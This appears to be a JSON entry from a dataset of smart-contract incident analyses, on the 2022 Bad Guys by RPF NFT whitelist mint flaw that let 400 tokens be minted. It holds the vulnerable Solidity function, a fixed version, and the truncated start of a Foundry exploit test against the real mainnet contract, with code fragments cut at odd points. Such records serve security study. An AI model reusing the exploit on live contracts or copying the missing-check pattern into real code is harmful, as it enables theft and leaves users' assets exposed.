@@ -1,0 +1,32 @@
+{
+ "id": "2022__2022-09-22_BadGuysbyRPF_MissingAmountCheck",
+ "source_file": "2022/2022-09-22_BadGuysbyRPF_MissingAmountCheck.md",
+ "title": "Bad Guys by RPF — WhiteListMint Quantity Validation Missing Attack Analysis",
+ "date": "2022-09-22",
+ "protocol": "Bad Guys by RPF",
+ "chain": "Ethereum Mainnet",
+ "loss_raw": "NFT dilution / Unconfirmed (400 NFTs minted beyond limit)",
+ "loss_usd": null,
+ "root_cause": "No upper-bound validation on the `chosenAmount` parameter in `WhiteListMint()`",
+ "attack_tx": "0xb613c68b00c532fe9b28a50a91c021d61a98d907d0217ab9b44cd8d6ae441d9f",
+ "vulnerable_contract": null,
+ "classes": [
+  "access-control"
+ ],
+ "code_before": [
+  "❌ Vulnerable WhiteListMint() - no upper-bound check on chosenAmount\nfunction WhiteListMint(\n    bytes32[] calldata merkleTree,\n    uint256 chosenAmount  //",
+  "❌ any value can be passed\n) external payable {\n    require(whiteListMintEnabled, \"WhiteList minting not enabled\");\n\n    // Verify whitelist via Merkle proof\n    bytes32 leaf = keccak256(abi.encodePacked(msg.sender));\n    require(\n        MerkleProof.verify(merkleTree, merkleRoot, leaf),\n        \"Not whitelisted\"\n    );\n\n    //",
+  "❌ No upper-bound validation on chosenAmount\n    // Intent: allow up to 3 mints per address\n    // Reality: any quantity (400, 1000, etc.) can be minted\n\n    // No duplicate-mint protection either\n    _safeMint(msg.sender, chosenAmount);\n}\n\n//"
+ ],
+ "code_after": [
+  "✅ Correct pattern - quantity and duplicate validation\nmapping(address => bool) public hasMinted;\n\nfunction WhiteListMint(\n    bytes32[] calldata merkleTree,\n    uint256 chosenAmount\n) external payable {\n    require(!hasMinted[msg.sender], \"Already minted\");     //",
+  "✅ prevent duplicate minting\n    require(chosenAmount > 0 && chosenAmount <= MAX_PER_WALLET, \"Invalid amount\"); //"
+ ],
+ "steps": [
+  "400 NFTs minted immediately",
+  "[4] Attacker NFT balance: 0 → 400"
+ ],
+ "other_code": [
+  "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\n\ninterface IBadGuysRPFERC721 {\n    function WhiteListMint(bytes32[] calldata merkleTree, uint256 chosenAmount) external payable;\n    function balanceOf(address owner) external view returns (uint256);\n}\n\ncontract BadGuysRPFExploit is Test {\n    IBadGuysRPFERC721 nft = IBadGuysRPFERC721(0xB84CBAF116eb90fD445Dd5AeAdfab3e807D2CBaC);\n    address owner = 0x09eFF2449882F9e727A8e9498787f8ff81465Ade;\n    address attacker = 0xBD8A137E79C90063cd5C0DB3Dbabd5CA2eC7e83e;\n\n    function setUp() public {\n        vm.createSelectFork(\"mainnet\", 15_460_093);\n        vm.deal(attacker, 10 ether);\n    }\n\n    function testExploit() public {\n        // [Step 1] Owner enables whitelist minting\n        // (In the actual att"
+ ]
+}
